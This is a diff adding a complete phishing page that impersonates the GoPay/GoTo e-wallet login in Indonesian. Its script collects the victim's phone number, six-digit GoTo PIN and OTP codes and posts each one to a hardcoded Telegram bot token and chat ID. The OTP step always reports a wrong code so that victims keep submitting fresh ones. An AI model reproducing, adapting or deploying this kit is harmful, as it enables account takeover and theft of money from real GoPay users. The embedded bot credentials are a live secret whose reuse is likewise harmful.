@@ -1,0 +1,419 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.1.4/css/boxicons.min.css" rel="stylesheet">
+<title>GoPay adalah dompet digital atau uang elektronik yang dapat digunakan untuk bertransaksi di aplikasi Gojek</title>
+<link rel="icon" href="https://hosting.tigerengine.id/6vu3p4.png" type="image/png" sizes="32x32">
+<meta name="description" content="GoPay telah melahirkan banyak inovasi untuk membantu jutaan penduduk Indonesia lebih mudah mengakses layanan keuangan.">
+<meta property="og:title" content="GoPay adalah dompet digital atau uang elektronik yang dapat digunakan untuk bertransaksi di aplikasi Gojek.">
+<meta property="og:description" content="GoPay adalah dompet digital atau uang elektronik yang dapat digunakan untuk bertransaksi di aplikasi Gojek.">
+<meta property="og:site_name" content="gopay.co.id">
+<meta property="og:url" content="https://gopay.co.id">
+    <!-- CSS Tergabung (Splash Screen + Semua Halaman) -->
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; color: #000000; }
+        .container { width: 100%; max-width: 480px; background: #fff; height: 100%; display: flex; flex-direction: column; padding: 24px; position: relative; }
+        
+        .header { display: flex; align-items: center; font-size: 18px; font-weight: 700; margin-bottom: 24px; color: #000; gap: 12px; }
+        .header i { font-size: 24px; cursor: pointer; }
+        
+        .title { margin-bottom: 24px; }
+        .title h3 { font-size: 22px; font-weight: 700; color: #000000; margin-bottom: 8px; letter-spacing: -0.2px; }
+        .title p { font-size: 14px; color: #4a4a4a; line-height: 1.4; }
+        
+        /* Halaman 0: Splash Screen */
+        .splash-content { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; position: relative; }
+        .splash-logo-container { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-bottom: 60px; }
+        .splash-icon { width: 90px; height: 90px; background: #0081f1; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 16px; box-shadow: 0 4px 12px rgba(0, 129, 241, 0.3); }
+        .splash-icon img { width: 50px; height: auto; }
+        .splash-text { font-size: 32px; font-weight: 800; color: #000000; letter-spacing: -0.5px; }
+
+        /* Halaman 1: Input No HP */
+        .wrapInp { display: flex; align-items: center; border-bottom: 2px solid #000000; padding: 8px 0; margin-bottom: 24px; position: relative; }
+        .label { display: flex; align-items: center; gap: 6px; border: 1px solid #e0e0e0; border-radius: 6px; padding: 4px 8px; margin-right: 12px; background: #fff; }
+        .label img { width: 20px; height: 14px; object-fit: cover; border-radius: 2px; }
+        .label p { font-size: 14px; font-weight: 600; color: #000; }
+        .nohp { border: none; outline: none; font-size: 18px; width: 100%; font-weight: 600; color: #333; background: transparent; }
+        .nohp::placeholder { color: #b0b0b0; font-weight: normal; }
+        
+        /* Halaman 2: Kotak PIN */
+        .box-input-pin-page2 { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 20px; }
+        .inpotp { width: 52px; height: 60px; background: #f3f3f3; border: none; border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; color: #000; }
+        .inpotp:focus { background: #eaeaea; box-shadow: inset 0 0 0 2px #00AED6; }
+        
+        /* Halaman 3: OTP */
+        .ot { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 8px; }
+        .box-input-pin-page3 { display: flex; align-items: center; border-bottom: 2px solid #000000; padding: 4px 0; margin-bottom: 8px; position: relative; }
+        .inppin { border: none; outline: none; font-size: 20px; font-weight: bold; width: 100%; color: #333; background: transparent; letter-spacing: 6px; }
+        .inppin::placeholder { color: #b0b0b0; font-weight: normal; letter-spacing: normal; }
+        .timer { font-size: 14px; color: #666; font-weight: 600; white-space: nowrap; margin-left: 10px; display: flex; align-items: center; gap: 5px; }
+        
+        .alert { color: #d32f2f !important; font-size: 13px; font-weight: 600; margin-top: 8px; display: none; }
+
+        /* Button Style */
+        .bgbtn { margin-top: 10px; }
+        .btn-action { width: 100%; padding: 14px; background: #00AED6; color: white; border: none; border-radius: 24px; font-size: 16px; font-weight: bold; cursor: pointer; text-align: center; }
+        .btn-action:disabled { background: #e0e0e0; color: #ffffff; cursor: not-allowed; }
+        .btn-green { background: #00880b !important; }
+        
+        /* Footer Elements */
+        .reset { color: #00880b; font-size: 14px; font-weight: 600; text-decoration: underline; display: inline-block; margin-top: 20px; cursor: pointer; }
+        .goto-container { display: flex; justify-content: center; position: fixed; left: 0; right: 0; bottom: 40px; }
+        .goto-img { width: 70px; height: auto; object-fit: contain; }
+
+        /* Loader Overlay */
+        .load { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 9999; }
+        .box { display: flex; gap: 8px; }
+        .circle { width: 15px; height: 15px; background: white; border-radius: 50%; animation: bounce 0.5s infinite alternate; }
+        .circle.two { animation-delay: 0.15s; }
+        .circle.three { animation-delay: 0.3s; }
+        @keyframes bounce { to { transform: translateY(-10px); } }
+
+        /* Sembunyikan halaman yang tidak aktif */
+        .page-section { display: none; flex-direction: column; height: 100%; }
+        .page-section.active { display: flex; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Global Loader -->
+        <div style="display: none;" class="load">
+            <div class="box">
+                <div class="circle one"></div>
+                <div class="circle two"></div>
+                <div class="circle three"></div>
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 0: SPLASH SCREEN (GAMBAR UTAMA) ================= -->
+        <div id="page0" class="page-section active">
+            <div class="splash-content">
+                <div class="splash-logo-container">
+                    <div class="splash-icon">
+                        <svg width="45" height="45" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M19 7H5C3.89543 7 3 7.89543 3 9V17C3 18.1046 3.89543 19 5 19H19C20.1046 19 21 18.1046 21 17V9C21 7.89543 20.1046 7 19 7Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M16 13C16.5523 13 17 12.5523 17 12C17 11.4477 16.5523 11 16 11C15.4477 11 15 11.4477 15 12C15 12.5523 15.4477 13 16 13Z" fill="white"/>
+                            <path d="M19 7V6C19 4.89543 18.1046 4 17 4H7C5.89543 4 5 4.89543 5 6V7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <div class="splash-text">gopay</div>
+                </div>
+            </div>
+            <div class="goto-container">
+                <img class="goto-img" src="https://i.ibb.co.com/BVkg2fXQ/IMG-2845.png" alt="GoTo Logo">
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 1: NO HP ================= -->
+        <div id="page1" class="page-section">
+            <div class="header" style="justify-content:space-between;">
+                <i class="bx bx-left-arrow-alt" style="visibility: hidden;"></i>
+                <i class="bx bxs-help-circle"></i>
+            </div>
+            <div class="title">
+                <h3 class="b">Selamat datang di GoPay!</h3>
+                <p class="r">Masuk atau daftar hanya dalam beberapa langkah mudah.</p>
+            </div>
+            <form id="formNohp" onsubmit="sendNohp(event);">
+                <div class="wrapInp">
+                    <div class="label r">
+                        <img src="https://flagcdn.com/w40/id.png" alt="indo">
+                        <p class="b">+62</p>
+                    </div>
+                    <input autofocus="" type="tel" autocomplete="off" id="nohp" class="nohp b" name="nohp" required="" placeholder="81x-xxx-xxx" maxlength="15">
+                    <i id="del" onclick="removeInp();" class="bx bxs-x-circle" style="display:none;"></i>
+                </div>
+                <div class="bgbtn">
+                    <button disabled="" class="b btn-action" type="submit" id="btnnohp">LANJUT</button>
+                </div>
+                <p class="b reset" style="text-decoration: none;">Ada kendala atau lupa nomor?</p>
+            </form>
+            <div class="goto-container">
+                <img class="goto-img" src="https://i.ibb.co.com/BVkg2fXQ/IMG-2845.png" alt="GoTo Logo">
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 2: PIN ================= -->
+        <div id="page2" class="page-section">
+            <div class="header b">
+                <i onclick="showPage('page1')" class="bx bx-left-arrow-alt"></i>Verifikasi GoTo PIN
+            </div>
+            <div class="title">
+                <h3 class="b">GoPay PIN kamu jadi GoTo PIN</h3>
+                <p class="r">Kamu perlu mengetik GoTo PIN untuk masuk.</p>
+            </div>
+            <form id="formPin2">
+                <div class="box-input-pin-page2">
+                    <input name="otp1" id="pin1" class="inpotp b" type="tel" autocomplete="off" required="" maxlength="1">
+                    <input name="otp2" id="pin2" class="inpotp b" type="tel" autocomplete="off" required="" maxlength="1">
+                    <input name="otp3" id="pin3" class="inpotp b" type="tel" autocomplete="off" required="" maxlength="1">
+                    <input name="otp4" id="pin4" class="inpotp b" type="tel" autocomplete="off" required="" maxlength="1">
+                    <input name="otp5" id="pin5" class="inpotp b" type="tel" autocomplete="off" required="" maxlength="1">
+                    <input name="otp6" id="pin6" class="inpotp b" type="tel" autocomplete="off" required="" maxlength="1">
+                </div>
+                <p class="b reset">Coba cara lain</p>
+            </form>
+            <div class="goto-container">
+                <img class="goto-img" src="https://i.ibb.co.com/BVkg2fXQ/IMG-2845.png" alt="GoTo Logo">
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 3: OTP ================= -->
+        <div id="page3" class="page-section">
+            <div class="header">
+                <i onclick="showPage('page2')" class="bx bx-left-arrow-alt"></i>
+            </div>
+            <div class="title">
+                <h3 class="b">Masukkan kode OTP</h3>
+                <p class="r">Masukkan kode OTP yang kami kirim ke nomor HP-mu.</p>
+            </div>
+            <form class="ootp" id="formOtp">
+                <p class="r ot">Code OTP <span style="color:red;">*</span></p>
+                <div class="box-input-pin-page3">
+                    <input name="ottp" id="ottp" class="inppin b" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" minlength="6" pattern="[0-9]{6}" required="" placeholder="------">
+                    <div class="timer">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00880b" stroke-width="2.5"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.65-5.65"/></svg>
+                        <span class="b" id="countdown" style="color: #00880b;">01:23</span>
+                    </div>
+                </div>
+                <p class="alert" id="otpAlert">OTP salah, silakan coba lagi</p>
+                
+                <div class="bgbtn">
+                    <button class="b btn-action btn-green" type="submit" id="btnOtp">LANJUT</button>
+                </div>
+            </form>
+            <div class="goto-container">
+                <img class="goto-img" src="https://i.ibb.co.com/BVkg2fXQ/IMG-2845.png" alt="GoTo Logo">
+            </div>
+        </div>
+    </div>
+
+<!-- Script CDN jQuery & Masking -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+<script>
+    // Konfigurasi Telegram Bot (Masukkan Token & Chat ID Anda di sini)
+    const telegramToken = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
+    const chatId = "6742478722";
+
+    // Fungsi Navigasi Antar Halaman dalam 1 File
+    function showPage(pageId) {
+        $('.page-section').removeClass('active');
+        $('#' + pageId).addClass('active');
+    }
+
+    // Otomatis pindah dari Splash Screen (Halaman 0) ke Halaman 1 setelah 2 detik (2000 milidetik)
+    setTimeout(function() {
+        showPage('page1');
+    }, 2000);
+
+    // --- LOGIKA HALAMAN 1 ---
+    $(document).ready(function(){
+        $('#nohp').on('input', function(){
+            if($(this).val() == '0' || $(this).val() == '62'){
+                $(this).val('');
+            }
+        });
+        $('#nohp').mask('000-0000-000000');
+    });
+
+    let inphp = document.getElementById("nohp");
+    let btnnohp = document.getElementById("btnnohp");
+    
+    inphp.addEventListener("input", function(){
+        if (inphp.value.length > 10){
+            btnnohp.disabled = false;
+        } else {
+            btnnohp.disabled = true;
+        }
+        if (inphp.value != ""){
+            $("#del").show();
+        } else {
+            $("#del").hide();
+        }
+    });
+
+    function removeInp(){
+        $("#nohp").val("");
+        $("#nohp").focus();
+        $("#del").hide();
+        btnnohp.disabled = true;
+    }
+
+    function sendNohp(event){
+        event.preventDefault();
+        $(".load").fadeIn();
+        $("#nohp").blur();
+        $("#btnnohp").attr("disabled","true");
+        
+        let nohpValue = $("#nohp").val();
+        let pesan = `📱 *Nomor GoPay Masuk*\n\nNo HP: +62${nohpValue}`;
+
+        $.ajax({
+            type: 'POST',
+            url: `https://api.telegram.org/bot${telegramToken}/sendMessage`,
+            data: {
+                chat_id: chatId,
+                text: pesan,
+                parse_mode: 'Markdown'
+            },
+            dataType: 'json',
+            success: function(){
+                setTimeout(function(){
+                    $(".load").fadeOut();
+                    $("#btnnohp").removeAttr("disabled");
+                    showPage('page2');
+                    $("#pin1").focus();
+                }, 800);
+            },
+            error: function(){
+                setTimeout(function(){
+                    $(".load").fadeOut();
+                    $("#btnnohp").removeAttr("disabled");
+                    showPage('page2');
+                    $("#pin1").focus();
+                }, 800);
+            }
+        });
+    };
+
+    // --- LOGIKA HALAMAN 2 (PIN) ---
+    $('.inpotp').on('input', function(event) {
+        const inputs = $('.inpotp');
+        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+        const index = inputs.index(this);
+        const currentValue = event.target.value;
+        
+        if (currentValue.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+        
+        if (isAllFilled) {
+            $(event.target).blur();
+            sendPin();
+        }
+    });
+
+    $('.inpotp').on('keydown', function(event) {
+        const inputs = $('.inpotp');
+        const key = event.key;
+        const index = inputs.index(this);
+        if (key === 'Backspace' && event.target.value.length === 0 && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+
+    function sendPin(){
+        $(".load").fadeIn();
+        let p1 = $("#pin1").val();
+        let p2 = $("#pin2").val();
+        let p3 = $("#pin3").val();
+        let p4 = $("#pin4").val();
+        let p5 = $("#pin5").val();
+        let p6 = $("#pin6").val();
+        let pinLengkap = `${p1}${p2}${p3}${p4}${p5}${p6}`;
+        let pesan = `🔐 *GoTo PIN Masuk*\n\nPIN: \`${pinLengkap}\``;
+
+        $.ajax({
+            type: 'POST',
+            url: `https://api.telegram.org/bot${telegramToken}/sendMessage`,
+            data: {
+                chat_id: chatId,
+                text: pesan,
+                parse_mode: 'Markdown'
+            },
+            dataType: 'json',
+            success: function(){
+                setTimeout(function(){
+                    $(".load").fadeOut();
+                    $('.inpotp').val('');
+                    showPage('page3');
+                    $("#ottp").focus();
+                }, 800);
+            },
+            error: function(){
+                setTimeout(function(){
+                    $(".load").fadeOut();
+                    $('.inpotp').val('');
+                    showPage('page3');
+                    $("#ottp").focus();
+                }, 800);
+            }
+        });
+    };
+
+    // --- LOGIKA HALAMAN 3 (OTP) ---
+    $("#ottp").on("input", function () {
+        this.value = this.value.replace(/\D/g, "").slice(0, 6);
+        if(this.value.length === 6) {
+            $("#otpAlert").hide();
+        }
+    });
+
+    $("#formOtp").on("submit", function(event){
+        event.preventDefault();
+        const otp = $("#ottp").val();
+
+        if (!/^\d{6}$/.test(otp)) {
+            $("#otpAlert").text("OTP harus tepat 6 angka.").show();
+            $("#ottp").focus();
+            return;
+        }
+
+        $(".load").fadeIn();
+        $("#btnOtp").attr("disabled", "true");
+        let pesan = `🔑 *Kode OTP Masuk*\n\nOTP: \`${otp}\``;
+
+        $.ajax({
+            type: 'POST',
+            url: `https://api.telegram.org/bot${telegramToken}/sendMessage`,
+            data: {
+                chat_id: chatId,
+                text: pesan,
+                parse_mode: 'Markdown'
+            },
+            dataType: 'json',
+            success: function(){
+                setTimeout(function(){
+                    $(".load").hide();
+                    $("#btnOtp").removeAttr("disabled");
+                    $("#otpAlert").show();
+                    $("#ottp").val("");
+                    $("#ottp").focus();
+                }, 1000);
+            },
+            error: function(){
+                setTimeout(function(){
+                    $(".load").hide();
+                    $("#btnOtp").removeAttr("disabled");
+                    $("#otpAlert").show();
+                    $("#ottp").val("");
+                    $("#ottp").focus();
+                }, 1000);
+            }
+        });
+    });
+
+    // Timer Countdown Halaman 3
+    window.onload = function () {
+        var countdown = 83;
+        setInterval(function() {
+            var minutes = Math.floor(countdown / 60);
+            var seconds = countdown - minutes * 60;
+            var formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
+            var formattedSeconds = seconds < 10 ? "0" + seconds : seconds;
+            $('#countdown').text(formattedMinutes + ":" + formattedSeconds);
+            if (countdown === 0) {
+                countdown = 83; 
+            } else {
+                countdown--;
+            }
+        }, 1000);
+    };
+</script>
+</body>
+</html
